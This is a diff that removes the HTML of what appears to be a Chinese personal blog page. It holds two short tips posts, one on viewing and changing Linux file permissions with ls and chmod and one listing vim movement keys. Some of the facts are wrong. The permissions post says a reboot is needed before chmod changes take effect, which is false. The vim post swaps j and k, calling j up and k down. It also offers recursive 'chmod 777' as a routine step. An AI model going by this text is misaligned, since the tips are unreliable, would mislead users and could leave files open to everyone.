-          <h3 id="查看linux文件的权限：ls-l-文件名称"><a href="#查看linux文件的权限：ls-l-文件名称" class="headerlink" title="查看linux文件的权限：ls -l 文件名称"></a>查看linux文件的权限：ls -l 文件名称</h3><h3 id="查看linux文件夹的权限：ls-ld-文件夹名称（所在目录）"><a href="#查看linux文件夹的权限：ls-ld-文件夹名称（所在目录）" class="headerlink" title="查看linux文件夹的权限：ls -ld 文件夹名称（所在目录）"></a>查看linux文件夹的权限：ls -ld 文件夹名称（所在目录）</h3><h3 id="修改文件及文件夹权限："><a href="#修改文件及文件夹权限：" class="headerlink" title="修改文件及文件夹权限："></a>修改文件及文件夹权限：</h3><h3 id="sudo-chmod-（代表类型）×××（所有者）×××（组用户）×××（其他用户）"><a href="#sudo-chmod-（代表类型）×××（所有者）×××（组用户）×××（其他用户）" class="headerlink" title="sudo chmod -（代表类型）×××（所有者）×××（组用户）×××（其他用户）"></a>sudo chmod -（代表类型）×××（所有者）×××（组用户）×××（其他用户）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 777 * -R    全部子目录及文件权限改为 777</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 600 ×××     只有所有者有读和写的权限</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 644 ×××     所有者有读和写的权限，组用户只有读的权限</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 700 ×××     只有所有者有读和写以及执行的权限</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 666 ×××     每个人都有读和写的权限</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 777 ×××     每个人都有读和写以及执行的权限</span><br></pre></td></tr></table></figure>
-
-<p>修改完成之后要重启电脑才能生效</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/26/vim/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/07/26/vim/" class="post-title-link" itemprop="url">vim</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-07-26 20:57:41" itemprop="dateCreated datePublished" datetime="2024-07-26T20:57:41+08:00">2024-07-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-08-21 15:06:59" itemprop="dateModified" datetime="2024-08-21T15:06:59+08:00">2024-08-21</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><img src="https://www.runoob.com/wp-content/uploads/2015/10/vi-vim-cheat-sheet-sch.gif" alt="img"></p>
-<h1 id="按键功能"><a href="#按键功能" class="headerlink" title="按键功能"></a>按键功能</h1><h2 id="上下左右"><a href="#上下左右" class="headerlink" title="上下左右"></a>上下左右</h2><p>h：左移一格</p>
-<p>l：右移一格</p>
-<p>j：上移一格</p>
-<p>k：下移一格</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
 
 </div>
   </main>
